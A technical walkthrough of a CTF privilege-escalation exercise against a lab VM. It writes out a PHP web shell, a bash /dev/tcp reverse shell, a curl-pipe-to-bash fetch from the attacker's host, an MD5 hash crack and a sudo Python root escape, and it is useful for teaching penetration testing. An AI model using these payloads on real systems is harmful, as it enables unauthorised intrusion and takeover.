# `escalator` — Complete Technical Documentation

> A privilege-escalation penetration-test exercise (CTF-style) against a deliberately-vulnerable Linux VM.
> Author: Mustapha Lbahja — Zone01 Oujda / CyberZ Security Club.
> Deliverable in this folder: `readme.MD` (the full walkthrough + reports) and four `.webp` proof screenshots.

---

## 0. Important note on the nature of this "project"

**There is no application source code in `escalator/`.** Unlike the other four projects in `DECTATOR`, `escalator` is not a program you build and run. It is a **security engagement write-up**: the record of manually chaining together six weaknesses in a target VM to go from *no access* to *root*, plus the remediation advice, a vulnerability-report email, and an ethical-hacking discussion.

Because the standard 20-section template is written for a codebase, this document **adapts** it:

| Template section | How it is interpreted here |
|---|---|
| "Architecture" | The lab network topology + the attack chain as a pipeline |
| "File structure" | The `readme.MD` structure + the two attack artifacts it references (`shell.php`, `rev.sh`) + the sudo one-liner |
| "Entry point" | The first attacker action (network discovery) |
| "Code deep dive" / "Code comments" | Byte-for-byte analysis of every command and payload used |
| "Libraries and dependencies" | The attacker toolchain (`nmap`, `gobuster`, `ftp`, `curl`, `nc`, `ssh`, CrackStation/John) |
| "OS / Network / Database concepts" | FTP, HTTP, TCP, sockets, `/dev/tcp`, PAM/`/etc/passwd`/`/etc/shadow`, `sudoers`, MD5 |
| "Security analysis" | The six vulnerabilities, each with mechanism + impact + fix |
| "Data flow" | How a single crafted request becomes a root shell |

Two payload files are named in the README's file table (`shell.php`, `rev.sh`) but are **not present** in the folder. Their contents are reproduced verbatim *inside* the README's walkthrough, so they are fully analyzed below; I note where a claim comes from the README text rather than a file on disk.

---

## 1. Project Overview

### Simple explanation

A "Capture The Flag" (CTF) box. Somewhere on a small private network there is a Linux machine set up with realistic mistakes an overworked sysadmin might make. The goal: starting as a complete outsider with no username or password, become the all-powerful `root` user and read a secret file (`/root/root.txt`).

You get there by **stacking small mistakes**:

1. The FTP server lets *anybody* log in as "anonymous" — and lets them **upload** files.
2. The folder those uploads land in is **also served by the web server**. So a file you upload by FTP can be *run* by asking the web server for it.
3. You upload a tiny PHP script that runs whatever command you send it. Now you can run commands on the box as the low-privilege web user (`www-data`).
4. You use that to make the box connect *back* to your laptop, giving you an interactive shell (a "reverse shell").
5. Poking around as `www-data`, you find a script that leaks a username and a scrambled ("hashed") password.
6. The hash is MD5 — a broken, reversible-in-practice scheme. You look it up online and get the plaintext password (`youaresmart`).
7. You log in over SSH as that user (`shrek`). You run `sudo -l` and discover this user is allowed to run **Python as root without a password**.
8. Python-as-root can just start a root shell: `sudo python3.5 -c 'import os; os.system("/bin/bash")'`. You are now root. You read the flag.

### Technical explanation

`escalator` documents an **unauthenticated remote-to-root** attack chain against a single Linux target (`192.168.56.101`, Ubuntu 16.04-era: OpenSSH 7.2p2, Apache 2.4.18, ProFTPD) on an isolated VirtualBox **host-only** network (`192.168.56.0/24`). The chain is:

```
recon (nmap) → anonymous FTP write → web/FTP directory overlap → PHP web shell (unauth RCE as www-data)
  → reverse shell via bash /dev/tcp → local enumeration → cleartext-adjacent credential leak in /.runme.sh
  → offline MD5 crack (CrackStation) → SSH as user 'shrek' → sudo NOPASSWD on /usr/bin/python3.5 (GTFOBins) → root
```

Two distinct vulnerability *classes* combine:

- **Initial access** = a misconfiguration composite: `Anonymous` FTP with `<Limit WRITE> AllowAll` **plus** the FTP anonymous root being the same directory tree as the Apache document root's `/files/` **plus** PHP execution enabled in that upload directory. Any one of the three removed breaks the chain here.
- **Privilege escalation** = a `sudoers` rule granting `shrek` `NOPASSWD` on a full language interpreter (`/usr/bin/python3.5`), which trivially spawns a root shell — a textbook **GTFOBins** escalation.

Supporting weaknesses: MD5 password hashing (fast, unsalted-by-appearance, rainbow-table/lookup-crackable) and secrets stored in a world-readable script (`/.runme.sh`).

**Problem it "solves" / objective.** As a *training* deliverable, it demonstrates: methodical reconnaissance, exploiting service misconfiguration for RCE, gaining an interactive foothold, local enumeration, credential cracking, and abusing `sudo` for vertical privilege escalation — then translating findings into a professional remediation report and reasoning about authorization/ethics.

**Who uses it.** Cybersecurity students and junior pentesters (the Zone01 Oujda curriculum), and — as a reference — anyone learning the standard Linux privilege-escalation methodology.

**Technologies / tools involved.**
- **Target services:** ProFTPD (FTP), Apache `2.4.18` + `mod_php` (HTTP), OpenSSH `7.2p2`, `sudo`, Python `3.5`, `bash`.
- **Attacker toolchain (Kali `192.168.56.102`):** `nmap`, `gobuster`, the `ftp` client, `curl`, `nc` (netcat), `python3 -m http.server`, `ssh`, and an online hash-lookup service (CrackStation; John the Ripper mentioned as an alternative).
- **Payloads:** a one-line PHP web shell; a one-line bash reverse shell; a one-line `sudo` Python escape.
- **Environment:** VirtualBox 7.x, host-only adapter `vboxnet0`, subnet `192.168.56.0/24`.

**Main "features"** (i.e. what the write-up delivers):
1. A repeatable, numbered exploitation walkthrough with exact commands and expected output.
2. A network topology diagram and target-identification method (by MAC / by open-port fingerprint).
3. A six-item remediation section (each vuln: risk rating + concrete fix).
4. A vulnerability-report email template.
5. An ethical-hacking report (authorization, legal frameworks — Morocco Law 09-08 / 07-03, CFAA, GDPR — responsible disclosure, harm avoidance, detection/prevention).
6. Four screenshots as proof of root (`screnn1.webp`, `screen2.webp`, `screnn3.webp`, `screen4.webp`).

---

## 2. Project Architecture

### 2.1 Lab network topology

```
┌──────────────────────────────────────────────────────────────┐
│                   HOST-ONLY NETWORK  192.168.56.0/24          │
│                                                              │
│   ┌──────────────────┐        ┌──────────────────────┐       │
│   │   KALI LINUX     │        │    ESCALATOR VM      │       │
│   │  (Attack box)    │◄──────►│    (Target)          │       │
│   │  192.168.56.102  │        │   192.168.56.101     │       │
│   │  nmap, gobuster, │        │  21/tcp  ProFTPD     │       │
│   │  ftp, curl, nc,  │        │  22/tcp  OpenSSH7.2p2│       │
│   │  ssh             │        │  80/tcp  Apache2.4.18│       │
│   └──────────────────┘        └──────────────────────┘       │
│                                                              │
│   ┌──────────────────┐   ┌──────────────────┐                │
│   │   HOST MACHINE   │   │  VBox DHCP srv   │                │
│   │   192.168.56.1   │   │  192.168.56.100  │                │
│   └──────────────────┘   └──────────────────┘                │
└──────────────────────────────────────────────────────────────┘
```

Host-only (not NAT) is chosen deliberately: NAT would prevent the attacker from reaching the target's inbound ports (breaking `nmap` service scans, the `nc` listener, and the reverse shell). Host-only gives bidirectional L2/L3 reachability while keeping all traffic off the real LAN and the internet.

### 2.2 The attack chain as a pipeline

```
Attacker (Kali)                        Target (192.168.56.101)
──────────────                         ────────────────────────
[1] nmap -sn  ───────────────────────►  ARP/ICMP sweep → host at .101
[2] nmap -sV -sC -p- ───────────────►   21 ProFTPD (anon), 22 SSH, 80 Apache

[3] ftp anonymous  ─────────────────►   ProFTPD <Anonymous>  (login OK)
    put shell.php  ─────────────────►   file lands in FTP root  ══╗
                                                                  ║  same directory tree
[4] gobuster dir  ──────────────────►   Apache: /files/  ◄════════╝  (FTP root == webroot/files)

[5] curl "…/files/shell.php?cmd=id" ─►  Apache → mod_php → system("id")
        ◄───────────────────────────    "uid=33(www-data) …"          (UNAUTH RCE)

[6] nc -lvnp 4444        (listener)
    python3 -m http.server 8080  (serves rev.sh)
    curl "…shell.php?cmd=curl http://KALI:8080/rev.sh|bash"
        ◄─── TCP connect back to KALI:4444 ───  bash -i >& /dev/tcp/KALI/4444 0>&1
    ==> interactive shell as www-data

[7] (in shell)  cat /home/important.txt      → "run /.runme.sh"
                cat /.runme.sh               → "shrek:061fe5e7b95d5f98208d7bc89ed2d569"

[8] CrackStation(061fe5…d569)  →  "youaresmart"          (offline, no target contact)

[9] ssh shrek@192.168.56.101   (password: youaresmart)
    sudo -l   →  "(root) NOPASSWD: /usr/bin/python3.5"

[10] sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
     ==> root@ubuntu:~#
     cat /root/root.txt  →  FLAG
```

### 2.3 Component roles

| Component | Role in the chain | Where it appears |
|---|---|---|
| `nmap -sn` | Host discovery — find the target IP on the /24 | Phase 1 |
| `nmap -sV -sC -p-` | Service/version + default-script scan of all 65535 ports | Phase 1 |
| ProFTPD `<Anonymous>` block | Grants unauthenticated login **and write** | Vuln 1 |
| Apache `/files/` alias | Serves the FTP upload directory over HTTP | Vuln 2 |
| `mod_php` / `php_flag engine on` in `/files/` | Executes uploaded `.php` as code | Vuln 3 |
| `shell.php` (`<?php system($_GET["cmd"]); ?>`) | Turns any HTTP request into a shell command | Phases 4–6 |
| `nc -lvnp 4444` | Catches the reverse connection | Phase 6 |
| `python3 -m http.server 8080` | Delivers `rev.sh` to the target without FTP | Phase 6 |
| `rev.sh` (`bash -i >& /dev/tcp/…/4444 0>&1`) | Upgrades one-shot RCE to an interactive shell | Phase 6 |
| `/.runme.sh` | World-readable script leaking `shrek`'s MD5 hash | Phase 7 (Vuln 4 + 5) |
| CrackStation / John | Offline reversal of the MD5 hash | Phase 8 (Vuln 6 — weak hash) |
| OpenSSH | Legitimate authenticated access as `shrek` | Phase 9 |
| `sudo -l` | Enumerates the `shrek` sudo grant | Phase 9 |
| `sudoers` NOPASSWD rule on `python3.5` | The privilege-escalation primitive | Vuln 6 (sudo) |
| `python3.5 -c 'os.system("/bin/bash")'` | Spawns a root shell | Phase 10 |

---

## 3. Project File Structure

```
escalator/
├── readme.MD          the entire deliverable: topology, concepts, attack flow,
│                      step-by-step walkthrough, remediation, report email, ethics
├── screnn1.webp       proof screenshot — root shell / id output
├── screen2.webp       proof screenshot — flag content
├── screnn3.webp       proof screenshot — privilege-escalation step
└── screen4.webp       proof screenshot — full attack chain
```

(`shell.php` and `rev.sh` are listed in the README's "Files in This Repository" table but are **not on disk** in this folder — their content lives inside the README walkthrough.)

### `readme.MD` — section map

| # | Section | Purpose | Inputs it assumes | Outputs it produces |
|---|---|---|---|---|
| 1 | Network Architecture & Setup | Establish the isolated lab; how to identify the target | A VirtualBox host-only network | The target IP `192.168.56.101` and its open ports |
| 2 | Core Concepts | Define privilege escalation (horizontal vs vertical) and each technique used | Reader with basic Linux knowledge | Conceptual grounding for the walkthrough |
| 3 | Attack Flow | One-screen ASCII map of all five phases | Section 2 concepts | A mental model of the chain |
| 4 | Walkthrough | The 9 numbered steps with exact commands + expected output | A reachable target on the lab net | A root shell + the flag |
| 5 | Remediation | 6 vulnerabilities, each: risk + fix (config snippets) | The findings from §4 | Actionable hardening guidance |
| 6 | Vulnerability Report Email | A professional disclosure email template | The findings + impact | A sendable report |
| 7 | Ethical Hacking Report | Authorization, legal frameworks, responsible disclosure, harm avoidance, detection/prevention, the ethical-hacker mindset | — | The "why this is legal and how to do it responsibly" narrative |

### The two attack artifacts (content from the README walkthrough)

- **`shell.php`** — created on Kali with `echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php`, uploaded via FTP `put`. **Purpose:** a minimal PHP *web shell* — a script that executes an OS command supplied in the URL. **Input:** the `cmd` HTTP GET parameter. **Output:** the command's stdout/stderr in the HTTP response body. **Depends on:** `mod_php` being enabled for `/files/`.
- **`rev.sh`** — created on Kali with `echo 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1' > /tmp/rev.sh`, hosted via `python3 -m http.server 8080`. **Purpose:** a *reverse shell* one-liner. **Input:** none (it's fetched and piped to `bash`). **Output:** a bash session whose stdin/stdout/stderr are wired to a TCP socket back to the attacker. **Depends on:** the target's `bash` being compiled with `/dev/tcp` support (Debian/Ubuntu default) and outbound TCP to the attacker being allowed.
- **The sudo escape** — `sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'`. **Purpose:** convert "may run python as root" into "am root". **Input:** none. **Output:** an interactive `bash` with `uid=0`.

---

## 4. Execution Flow

### 4.1 Flow diagram

```
 START (attacker has L3 reachability to 192.168.56.0/24, nothing else)
   │
   ▼
[1] nmap -sn 192.168.56.0/24
        → live hosts; target = 192.168.56.101 (only host with FTP+HTTP+SSH)
        → confirm: nc -nv 192.168.56.101 21  → "220 ProFTPD Server"
   │
   ▼
[2] nmap -sV -sC -p- 192.168.56.101
        → 21/tcp ProFTPD  (Anonymous login allowed)   ← critical
          22/tcp OpenSSH 7.2p2
          80/tcp Apache 2.4.18 (Ubuntu)
   │
   ▼
[3] ftp 192.168.56.101   (user: anonymous, pass: <empty>)
        → login OK; ls → life.c, template.html  (decoys / rabbit holes)
   │
   ▼
[4] gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
        → /files/  (contents identical to FTP root  ⇒  FTP uploads are web-accessible)
   │
   ▼
[5] echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
    ftp → put /tmp/shell.php shell.php
    curl "http://192.168.56.101/files/shell.php?cmd=id"
        → uid=33(www-data) gid=33(www-data)          ← UNAUTH RCE CONFIRMED
   │
   ▼
[6] Terminal 1:  nc -lvnp 4444                              (listener)
    Terminal 2:  echo 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1' > /tmp/rev.sh
                 cd /tmp && python3 -m http.server 8080     (payload host)
    Terminal 3:  curl -G "http://192.168.56.101/files/shell.php" \
                   --data-urlencode "cmd=curl http://192.168.56.102:8080/rev.sh|bash"
        → Terminal 1 receives a shell as www-data           ← INTERACTIVE FOOTHOLD
   │
   ▼
[7] (www-data shell)
    cat /home/important.txt        → hint: run /.runme.sh
    cat /.runme.sh                 → shrek:061fe5e7b95d5f98208d7bc89ed2d569
   │
   ▼
[8] CrackStation("061fe5e7b95d5f98208d7bc89ed2d569")   (offline, browser on Kali)
        → 061fe5e7b95d5f98208d7bc89ed2d569 = youaresmart   ← CREDENTIAL RECOVERED
   │
   ▼
[9] ssh shrek@192.168.56.101   (password: youaresmart)
    sudo -l   → (root) NOPASSWD: /usr/bin/python3.5        ← ESCALATION PRIMITIVE
   │
   ▼
[10] sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
        → root@ubuntu:~#
     id  → uid=0(root) gid=0(root) groups=0(root)
     cat /root/root.txt  → Flag: 01Talent@nokOpA3eToFrU8r5sW1dipe2aky
 END
```

### 4.2 Step-by-step narrative

1. **Host discovery.** `nmap -sn` (no port scan; ARP on-link + ICMP echo/timestamp + TCP ACK to 80/443) enumerates live hosts. `.1` is the host gateway, `.100` the VirtualBox DHCP server, `.102` is you; `.101` is the only remaining host and the only one answering on 21/80/22. Confirmed by banner-grabbing FTP with `nc -nv … 21` → `220 ProFTPD Server`.

2. **Service enumeration.** `nmap -sV` does a TCP connect + protocol probe to fingerprint each service's product and version; `-sC` runs the "default" NSE script category (safe, non-intrusive), which for FTP includes `ftp-anon` — the script that reports **"Anonymous FTP login allowed."** `-p-` scans all 65535 TCP ports so nothing is missed.

3. **FTP enumeration.** The `ftp` client connects; username `anonymous`, empty password. ProFTPD's `<Anonymous>` block accepts it. `ls` shows `life.c` and `template.html` — the README flags these as **rabbit holes** (decoys placed to waste time).

4. **Web content discovery.** `gobuster dir` sends an HTTP GET for each word in a wordlist appended to the base URL, reporting non-404 responses. It finds `/files/`, whose listing matches the FTP root — proving the FTP anonymous directory and the web server's `/files/` are the **same directory on disk**.

5. **Web shell upload → RCE.** A one-line PHP shell is written locally and `put` over FTP into that shared directory. Requesting `http://…/files/shell.php?cmd=id` makes Apache hand the file to `mod_php`, which executes `system($_GET["cmd"])` → runs `id` as the Apache worker user. Response body: `uid=33(www-data) gid=33(www-data)`. This is **unauthenticated remote code execution**.

6. **Reverse shell.** The web shell is *one command per request* and non-interactive. To get a real shell: (T1) `nc -lvnp 4444` listens; (T2) `rev.sh` containing `bash -i >& /dev/tcp/192.168.56.102/4444 0>&1` is served over an ad-hoc HTTP server on 8080; (T3) the web shell is told to `curl` that file and pipe it to `bash`. The target's bash opens a TCP connection *out* to Kali:4444 and binds its interactive shell's stdin/stdout/stderr to that socket. T1 now has an interactive `www-data` shell. Going *outbound* like this sidesteps inbound firewall rules and NAT on the target side.

7. **Local enumeration / credential leak.** In the shell: `/home/important.txt` is a breadcrumb pointing at `/.runme.sh`; `/.runme.sh` is world-readable and contains `shrek:061fe5e7b95d5f98208d7bc89ed2d569` — a username and an **MD5** password hash. (Storing a credential — even hashed — in a world-readable script is Vuln 4/5.)

8. **Offline hash crack.** The 32-hex-character string is an MD5 digest. Pasted into CrackStation (a precomputed lookup of billions of hash→plaintext pairs), it resolves to `youaresmart`. This happens entirely on the attacker side — **no packet is sent to the target** — so it's undetectable by the target and legally the least-fraught step.

9. **Authenticated access + sudo enumeration.** `ssh shrek@192.168.56.101` with `youaresmart` succeeds. `sudo -l` (list this user's sudo privileges) prints `(root) NOPASSWD: /usr/bin/python3.5` — `shrek` may run that exact binary as root without entering a password.

10. **Privilege escalation to root.** `sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'` runs Python **as root**; the Python one-liner shells out to `/bin/bash`, which inherits the root effective UID → `root@ubuntu:~#`. `cat /root/root.txt` yields the flag `01Talent@nokOpA3eToFrU8r5sW1dipe2aky`.

---

## 5. Entry Point

The "entry point" of an engagement is the **first action the attacker takes** and the assumptions behind it.

- **Where it starts.** On the Kali box (`192.168.56.102`), with only **network-layer reachability** to `192.168.56.0/24` — no credentials, no prior knowledge of the target's IP, no shell.
- **First command.** `sudo nmap -sn 192.168.56.0/24` — a *ping sweep* (host discovery only, `-sn` = "no port scan"). `sudo` is needed so nmap can send raw ARP requests on the local segment (far more reliable on-link than ICMP).
- **Initialization / prerequisites.**
  - The lab must be a **host-only** network so the attacker can reach inbound ports (the README calls out that NAT would break this).
  - The attacker identifies which live host is the target by two independent signals: **MAC OUI** (`08:00:27:xx` = VirtualBox NICs; the gateway `.1` shows `0A:00:27:xx`; your own box shows no MAC because nmap never lists your own) and **service fingerprint** (only `.101` exposes FTP+HTTP+SSH).
  - Confirmation: `nc -nv 192.168.56.101 21` → the `220 ProFTPD Server` banner.
- **Environment variables / config.** None for the attacker tooling in this write-up. Wordlist paths (`/usr/share/wordlists/dirb/common.txt`) are Kali defaults.
- **Dependencies.** `nmap` on the attack box; a reachable target.
- **Error handling / rules of engagement.** The README's §7 defines the "entry conditions" ethically: written authorization, defined scope (only the provided VM / `192.168.56.0/24`), defined timeframe, no DoS, stop-if-in-doubt. Here the authorization is "the provided Escalator Challenge VM in an isolated lab" — a fully sanctioned target.

There is no `main()` and no source; the closest analogue to "the entry-point code" is:

```bash
sudo nmap -sn 192.168.56.0/24        # 1. who is alive?
sudo nmap -sV -sC -p- 192.168.56.101 # 2. what are they running?
```

Everything after depends on step 2 revealing "21/tcp ProFTPD — Anonymous login allowed."

---

## 6. Code Deep Dive — every command and payload

Since there is no application code, this section dissects each **command line and payload** used, in the four-part form (Purpose / Inputs / Internal logic / Output).

---

### 6.1 `nmap -sn 192.168.56.0/24`

**A. Purpose.** Enumerate which of the 254 usable addresses in the `/24` are live, without touching any ports — the first map of the battlefield.

**B. Inputs.**
- `-sn` — "ping scan / no port scan" (formerly `-sP`). Value: a mode flag.
- `192.168.56.0/24` — target **CIDR** block: base address `192.168.56.0`, `/24` = 24 network bits ⇒ 256 addresses (`.0` network, `.255` broadcast, `.1`–`.254` hosts).
- Implicit: run as root (`sudo`) so raw ARP is available.

**C. Internal logic.**
- On a **local Ethernet segment**, nmap `-sn` primarily sends **ARP requests** ("who has 192.168.56.X? tell 192.168.56.102") for every address. ARP is L2 and cannot be firewalled by a host-based IP firewall, so it reveals hosts that drop ICMP.
- For off-link targets it would instead send ICMP echo, ICMP timestamp, a TCP SYN/ACK to 443, and a TCP ACK to 80.
- Any ARP reply ⇒ that IP is up; nmap records the responding MAC address.

**D. Output.** A list of live IPs with MACs. Here: `.1` (host/gateway, `0A:00:27` OUI), `.100` (VBox DHCP), `.101` (target, `08:00:27`), `.102` (self). Used to pick `.101` as the target.

---

### 6.2 `nmap -sV -sC -p- 192.168.56.101`

**A. Purpose.** Identify every listening TCP service on the target and its software/version, and run safe discovery scripts against them.

**B. Inputs.**
- `-sV` — **service/version detection**: after finding an open port, nmap sends a series of protocol probes and matches the responses against its `nmap-service-probes` fingerprint database.
- `-sC` — run the **`default` NSE (Nmap Scripting Engine) script category**: ~60 scripts marked safe + useful for discovery (e.g. `ftp-anon`, `http-title`, `ssh-hostkey`, `http-server-header`).
- `-p-` — scan **all 65535 TCP ports** (default is the top 1000).
- `192.168.56.101` — the target.

**C. Internal logic.**
1. **Host discovery** (same as `-sn`) unless `-Pn`.
2. **Port scan** — default `-sS` (SYN "half-open") if root, else `-sT` (full connect). For each port: send SYN; `SYN/ACK` ⇒ open, `RST` ⇒ closed, no reply ⇒ filtered.
3. **`-sV`** — for each open port, open a real connection and send version probes; parse banners/responses.
4. **`-sC`** — run matching default scripts. For port 21, `ftp-anon` attempts an `anonymous`/`anonymous@` login and reports success — **this single line is what makes the whole chain possible.**

**D. Output.**
```
21/tcp  open  ftp     ProFTPD    |_ftp-anon: Anonymous FTP login allowed
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
```
Consumed by the analyst to decide the initial-access vector (anonymous FTP).

---

### 6.3 `ftp 192.168.56.101` → anonymous login → `put`

**A. Purpose.** Log in to FTP with no credentials and upload the web shell.

**B. Inputs.** Host IP; username `anonymous` (or `ftp`); password: anything (conventionally an email, here just Enter). Then `put /tmp/shell.php shell.php`.

**C. Internal logic — the FTP protocol.**
- FTP uses a **control connection** on TCP **21** for commands (`USER`, `PASS`, `TYPE`, `PASV`/`PORT`, `STOR`, `RETR`, `LIST`) and a **separate data connection** for file/listing bytes.
- **Passive mode** (client default): client sends `PASV`; server replies with an IP+port; client opens the data connection *to* the server (NAT/firewall-friendly).
- The server (ProFTPD) has an `<Anonymous>` block mapping the `anonymous` login to the local `ftp` account and a chroot directory, and — crucially here — a `<Limit WRITE> AllowAll </Limit>` (or absence of a `DenyAll`), so `STOR` (upload) is permitted.
- `put local remote` → the client issues `TYPE I` (binary), `PASV`, then `STOR shell.php`, then streams the file bytes over the data connection.

**D. Output.** `shell.php` written into the anonymous FTP root — which is the same on-disk directory Apache serves as `/files/`. Side effect: a new attacker-controlled file inside the web root.

---

### 6.4 `gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt`

**A. Purpose.** Discover unlinked directories/files on the web server by brute force — specifically to find where FTP uploads are exposed.

**B. Inputs.** `-u` base URL; `-w` wordlist (one candidate path per line, ~4600 entries in `dirb/common.txt`).

**C. Internal logic.** For each word `w`, gobuster issues `GET http://192.168.56.101/w` (concurrently, many workers). It classifies by status code: `200` (exists), `301/302` (redirect — often a directory), `403` (exists but forbidden), `404` (skip). Optionally follows up with a trailing-slash request. It does **not** parse HTML or crawl links — it's pure path guessing.

**D. Output.** A hit list including `/files/ (Status: 301)`. Manually browsing `/files/` shows the same `shell.php`, `life.c`, `template.html` seen over FTP ⇒ **directory overlap confirmed**.

---

### 6.5 `shell.php` — `<?php system($_GET["cmd"]); ?>`

**A. Purpose.** A **web shell**: a server-side script that runs an arbitrary OS command chosen by the HTTP client and returns its output. It converts "I can put a file in the web root" into "I can run commands on the server."

**B. Inputs.**
- `$_GET["cmd"]` — the PHP superglobal holding the URL query-string parameter `cmd`. Type: string. Source: fully attacker-controlled, straight from the request line. Example: `?cmd=id`, `?cmd=cat%20/etc/passwd`, `?cmd=curl%20http://KALI:8080/rev.sh|bash`.

**C. Internal logic.**
- `<?php … ?>` — PHP code delimiters; Apache's `mod_php` executes anything between them when the file has a `.php` extension **and** the PHP engine is enabled for that directory (`php_flag engine on`, the default).
- `system($string)` — a PHP builtin that runs `$string` via the system shell (`/bin/sh -c "$string"`), streams the command's stdout directly into the HTTP response body, and returns the last line. Because it goes through `/bin/sh -c`, shell metacharacters work: pipes (`|`), redirection, `;`, `&&`, command substitution.
- No input validation, no auth, no output encoding — that is the entire point of a web shell (and simultaneously why it's such a severe finding when a *defender* discovers one).

**D. Output.** The command's output in the HTTP `200` response body. `?cmd=id` → `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Side effects: whatever the command does, running with the privileges of the Apache worker process (`www-data`, UID 33). This is the RCE foothold.

**Concrete example.**
```
Request:  GET /files/shell.php?cmd=id HTTP/1.1
Server:   Apache → mod_php → system("id") → /bin/sh -c "id"
Response: 200 OK
          uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### 6.6 `rev.sh` — `bash -i >& /dev/tcp/192.168.56.102/4444 0>&1`

**A. Purpose.** Upgrade the stateless one-command-per-request web shell into a **persistent interactive shell** on the attacker's terminal.

**B. Inputs.** None at runtime (the string is fetched and executed). Parameters baked in: attacker IP `192.168.56.102`, attacker port `4444`.

**C. Internal logic — piece by piece.**
- `bash -i` — start bash in **interactive** mode (job control, prompt, reads commands from stdin, runs `.bashrc`). Interactive is what makes it usable as a shell rather than a one-shot.
- `/dev/tcp/HOST/PORT` — **not a real device file.** It's a special path *bash itself* interprets: opening it makes bash create a TCP socket and `connect()` to `HOST:PORT`. Available only in bash (and only if compiled with `--enable-net-redirections`, which Debian/Ubuntu bash is). `/dev/udp/...` is the UDP analogue.
- `>&` — redirect **both stdout (fd 1) and stderr (fd 2)** to what follows. So the shell's output and error streams go into the TCP socket → the attacker sees them.
- `0>&1` — redirect **stdin (fd 0)** to wherever fd 1 now points (the socket). So what the attacker types into `nc` is fed to the shell as input.
- Net effect: fds 0/1/2 of an interactive bash are all the one TCP connection to `192.168.56.102:4444`. The attacker's `nc` listener is now a remote terminal.
- **Why "reverse":** the target initiates the *outbound* connection. A normal ("bind") shell would have the target *listen* on a port, which inbound firewall rules and NAT usually block. Outbound to an arbitrary host:port is far more often allowed.

**D. Output.** On the attacker's `nc -lvnp 4444`: `connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] …` followed by a live `www-data@…$` prompt. Side effect: a long-lived process (`bash`) on the target holding a socket to the attacker.

**Delivery mechanism.**
```
T1: nc -lvnp 4444
T2: echo 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1' > /tmp/rev.sh ; cd /tmp ; python3 -m http.server 8080
T3: curl -G "http://192.168.56.101/files/shell.php" --data-urlencode "cmd=curl http://192.168.56.102:8080/rev.sh|bash"
```
`curl -G --data-urlencode "cmd=…"` puts a properly URL-encoded `cmd` value into the query string (so spaces, `/`, `|` survive). On the target, the web shell runs `curl http://192.168.56.102:8080/rev.sh | bash` — fetch the one-liner and execute it in a *new* bash, which then connects back. `python3 -m http.server` is used instead of a second FTP upload because it's faster and needs no auth.

---

### 6.7 Local enumeration — `cat /home/important.txt`, `cat /.runme.sh`

**A. Purpose.** As `www-data`, find a path to a more privileged user.

**B. Inputs.** File paths. `/home/important.txt` (a planted breadcrumb), `/.runme.sh` (a script at filesystem root).

**C. Internal logic.** Standard Linux enumeration: read world-readable files, look at `/home`, `/var/www`, cron, SUID binaries, `sudo -l`, etc. Here the box hands you a trail: `important.txt` says "run `/.runme.sh`", and `/.runme.sh` — readable by `www-data` because its permissions are too loose — contains `shrek:061fe5e7b95d5f98208d7bc89ed2d569`.

**D. Output.** A username (`shrek`) and a 32-hex-character string (an MD5 hash). This is the pivot material.

---

### 6.8 MD5 crack — CrackStation lookup of `061fe5e7b95d5f98208d7bc89ed2d569`

**A. Purpose.** Recover the plaintext password behind the hash so it can be used for SSH.

**B. Inputs.** The 32-hex-digit MD5 digest.

**C. Internal logic.**
- **MD5** is a cryptographic hash: input of any length → a fixed 128-bit (32-hex-char) digest, deterministic and one-way *by design*.
- It is **not one-way in practice for passwords** because: (1) it's extremely fast to compute (billions/sec on a GPU), so brute force and dictionary attacks are cheap; (2) if unsalted, identical passwords yield identical hashes, so a **precomputed lookup table / rainbow table** of `hash → plaintext` for every common password can be built once and reused. CrackStation is exactly such a lookup service (15+ billion entries).
- Pasting the hash returns `youaresmart` instantly — it was in the table.
- Alternative offline: `echo '061fe5…:$dynamic_0$…' | john --format=raw-md5 --wordlist=rockyou.txt` (John the Ripper hashes each wordlist entry with MD5 and compares).

**D. Output.** Plaintext `youaresmart`. **No network traffic to the target** — the crack is done in the attacker's browser against a third-party dataset.

---

### 6.9 `ssh shrek@192.168.56.101` + `sudo -l`

**A. Purpose.** Turn the recovered credential into a legitimate, stable session; then enumerate what `shrek` can do as root.

**B. Inputs.** Username `shrek`, password `youaresmart`.

**C. Internal logic.**
- **SSH** (Secure Shell) — encrypted remote login on TCP 22. Key exchange (Diffie-Hellman) → session keys → the server offers auth methods; `password` auth sends the password over the now-encrypted channel; the server validates it against `/etc/shadow` via PAM.
- `sudo -l` — asks `sudo` to print the current user's entries from `/etc/sudoers` (and `/etc/sudoers.d/*`). Output line `(root) NOPASSWD: /usr/bin/python3.5` means: `shrek` may run **exactly** `/usr/bin/python3.5` (with any arguments) **as root** (`(root)`) **without being prompted for a password** (`NOPASSWD`).

**D. Output.** An interactive `shrek@ubuntu:~$` shell, and the knowledge that `python3.5` is a root-capable binary for this user.

---

### 6.10 `sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'`

**A. Purpose.** The privilege escalation itself: from `shrek` to `root`.

**B. Inputs.** The exact binary path `/usr/bin/python3.5` (must match the sudoers rule); `-c` + a Python string.

**C. Internal logic.**
- `sudo <cmd>` — `sudo` checks `/etc/sudoers`; the rule matches; because of `NOPASSWD` it does **not** prompt; it sets the process's real+effective UID/GID to **0 (root)** and `execve`s `/usr/bin/python3.5` with the given args.
- Python now runs **as root**. `-c 'CODE'` executes `CODE` as a script.
- `import os; os.system("/bin/bash")` — `os.system` runs `/bin/bash` via `/bin/sh -c`. The child bash inherits the process's UID 0.
- Result: an interactive bash with `uid=0(root)`.
